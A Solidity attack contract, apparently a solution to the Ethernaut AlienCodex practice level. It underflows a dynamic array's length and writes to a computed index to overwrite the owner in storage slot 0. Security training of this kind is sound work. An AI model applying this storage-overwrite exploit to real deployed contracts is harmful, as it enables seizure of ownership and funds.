// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../levels/AlienCodex.sol";

contract AlienCodexAttack {
  AlienCodex public target;

  constructor(address _target) public {
    target = AlienCodex(_target);
  }

  function attack(bytes32 _newOwner) public{
    // make contact
    target.makeContact();

    //init array
    target.record(bytes32(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff));

    //underflow array length
    target.retract();
    target.retract();

    //Compute Owner's slot offset referenced to array index 0 slot
    //Owner is in slot 0000000000000000000000000000000000000000000000000000000000000000
    //array is in slot 0000000000000000000000000000000000000000000000000000000000000001
    //array[0] is in slot H(0x0000000000000000000000000000000000000000000000000000000000000001) = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 
    //to write Owner's slot wee have to write array[offset],
    //where offset = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 0x0000000000000000000000000000000000000000000000000000000000000001

    uint256 offset = 
      uint256(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
      - uint256(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)
      + uint256(0x0000000000000000000000000000000000000000000000000000000000000001);
  
    //change ownership
    target.revise(offset,_newOwner);
  }
}
